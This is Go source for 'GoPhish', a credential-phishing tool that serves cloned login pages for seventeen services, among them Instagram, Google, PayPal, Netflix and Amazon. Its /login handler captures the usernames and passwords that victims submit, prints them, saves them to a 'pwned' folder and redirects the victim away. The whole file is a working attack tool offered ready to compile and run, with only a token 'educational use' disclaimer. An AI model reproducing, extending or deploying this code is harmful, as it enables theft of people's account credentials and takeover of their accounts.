/*
A login phishing tool created by @DeadVCR.
http://deadvcr.com/
Simply compile and run. No dependencies needed!
Credits (Copyright)
Pages generated by An0nUD4Y (https://github.com/An0nUD4Y):
Instagram
Phishing Pages generated by Social Fish tool (UndeadSec) (https://github.com/UndeadSec/SocialFish):
Facebook,Google,Twitter
Phishing Pages generated by @suljot_gjoka (https://github.com/whiteeagle0/blackeye):
PayPal,eBay,CryptoCurrency,Adobe ID,Messenger,Twitch,Myspace,devianART
if I missed some let me know lol
**Reminder that DropBox is a steaming pile of shit and you should never ever use it :)**
*/

package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"html/template"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"sort"
	"strings"
)

func main() {
	initChoices()
	menu()
}

var choices map[int]string

// Login stores the user's login data
type Login struct {
	Username string
	Password string
}

// ChoiceHandler stores the user's choice
type ChoiceHandler struct {
	Choice string
	Redir  string
}

// Defaults store's the connection defaults
type Defaults struct {
	Redirect string
	BindIP   string
	BindPort string
}

func menu() {

	displayMenu(true, "@DeadVCR", "http://deadvcr.com/")

	loaddefaults, err := ioutil.ReadFile("defaults.json")
	var defaults Defaults
	if err != nil {
		log.Fatal(err)
	}
	json.Unmarshal([]byte(loaddefaults), &defaults)

	reader := bufio.NewReader(os.Stdin)
	fmt.Print("[*] Choose an option: ")
	choice, _ := reader.ReadString('\n')
	fmt.Print("[*] Choose redirect URL (Default is " + defaults.Redirect + "): ")
	redir, _ := reader.ReadString('\n')
	fmt.Print("[*] Enter IP to listen on (Default is " + defaults.BindIP + "): ")
	listenip, _ := reader.ReadString('\n')
	fmt.Print("[*] Enter port to listen on (Default is " + defaults.BindPort + "): ")
	listenport, _ := reader.ReadString('\n')

	if len(listenip) <= 2 {
		listenip = defaults.BindIP
	}
	listenip = strings.TrimSpace(listenip)
	redir = strings.TrimSpace(redir)
	listenport = strings.TrimSpace(listenport)
	if redir == "" {
		redir = defaults.Redirect
	}
	if len(listenport) == 0 {
		listenport = defaults.BindPort
	}
	bloatedChoiceHandler(choice)
	loadTheWebMan(choice, listenip, listenport, redir)

}

func bloatedChoiceHandler(choice string) string {
	choice = strings.TrimSpace(choice)
	returns := "default"
	switch choice {
	case "1":
		returns = "instagram"
	case "2":
		returns = "facebook"
	case "3":
		returns = "twitter"
	case "4":
		returns = "google"
	case "5":
		returns = "paypal"
	case "6":
		returns = "steam"
	case "7":
		returns = "linkedin"
	case "8":
		returns = "ebay"
	case "9":
		returns = "cryptocurrency"
	case "10":
		returns = "adobe"
	case "11":
		returns = "messenger"
	case "12":
		returns = "twitch"
	case "13":
		returns = "badoo"
	case "14":
		returns = "devianart"
	case "15":
		returns = "snapchat"
	case "16":
		returns = "netflix"
	case "17":
		returns = "amazon"
	}
	if returns == "default" {
		log.Fatal("Please enter a valid option. (Example: '1' for Instagram)")
	}
	return returns
}

func loadTheWebMan(choice, listenip, listenport, redir string) {
	choiceHandler := &ChoiceHandler{Choice: choice, Redir: redir}
	http.HandleFunc("/login", choiceHandler.giveMeYourInfo)
	http.HandleFunc("/", choiceHandler.epicTemplateLoader)
	http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("./static"))))
	fmt.Println("[*] HTTP listener started on " + listenip + ":" + listenport)
	log.Fatal(http.ListenAndServe(listenip+":"+listenport, nil))
}

func (p *Login) lmaoOwnedInfo(choice string) error {
	filename := p.Username + ".json"
	var login Login
	json.Unmarshal([]byte(filename), &login)
	m := Login{p.Username, p.Password}
	b, err := json.Marshal(m)
	if err != nil {
		log.Fatal(err)
	}

	path := "pwned/" + choice

	if _, err := os.Stat(path); os.IsNotExist(err) {
		os.Mkdir(path, 0755)
	}
	fmt.Println("[!] Login retrieved!")
	fmt.Println("[!] Username: " + p.Username)
	fmt.Println("[!] Password: " + p.Password)
	fmt.Println("[*] Saved to " + path + "/" + filename)

	return ioutil.WriteFile(path+"/"+filename, b, 0755)
}

func (ch *ChoiceHandler) epicTemplateLoader(w http.ResponseWriter, r *http.Request) {
	theChoice := bloatedChoiceHandler(ch.Choice)
	p := &Login{}
	t, _ := template.ParseFiles("templates/" + theChoice + "/login.html")
	t.Execute(w, p)
}

func (ch *ChoiceHandler) giveMeYourInfo(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html")
	username := r.FormValue("username")
	password := r.FormValue("password")
	p := &Login{Username: username, Password: password}
	if p.Username == "" || p.Password == "" {
		http.Error(w, "Please enter a valid username or password!", 500)
		return
	}
	theChoice := bloatedChoiceHandler(ch.Choice)
	p.lmaoOwnedInfo(theChoice)
	http.Redirect(w, r, "//"+ch.Redir, http.StatusFound)
}

func displayMenu(warning bool, name string, website string) {
	strings := []string{
		"",
		"Created by " + name,
		website, "",
		"GoPhish - Login Phishing Tool",
		"!!WARNING!! - Developers assume no liability and are not responsible to damage",
		"caused by this program. Please use ONLY for educational purposes. Thank you!",
		"--> ATTACKING TARGETS WITHOUT CONSENT IS ILLEGAL! <--",
		"",
		"Now... Pick your poison :)",
		"",
	}

	for _, v := range strings {
		fmt.Println(v)
	}

	ints := make([]int, 0, len(choices))
	for i := range choices {
		ints = append(ints, i)
	}
	sort.Ints(ints)

	for _, v := range ints {
		fmt.Printf("[%d] %s\n", v, choices[v])
	}

}

func initChoices() {
	choices = make(map[int]string)
	choices[1] = "Instagram"
	choices[2] = "Facebook"
	choices[3] = "Twitter"
	choices[4] = "Google"
	choices[5] = "PayPal"
	choices[6] = "Steam"
	choices[7] = "Linkedin"
	choices[8] = "eBay"
	choices[9] = "CryptoCurrency"
	choices[10] = "Adobe ID"
	choices[11] = "Messenger"
	choices[12] = "Twitch"
	choices[13] = "Badoo"
	choices[14] = "devianART"
	choices[15] = "Snapchat"
	choices[16] = "Netflix"
	choices[17] = "Amazon"
}
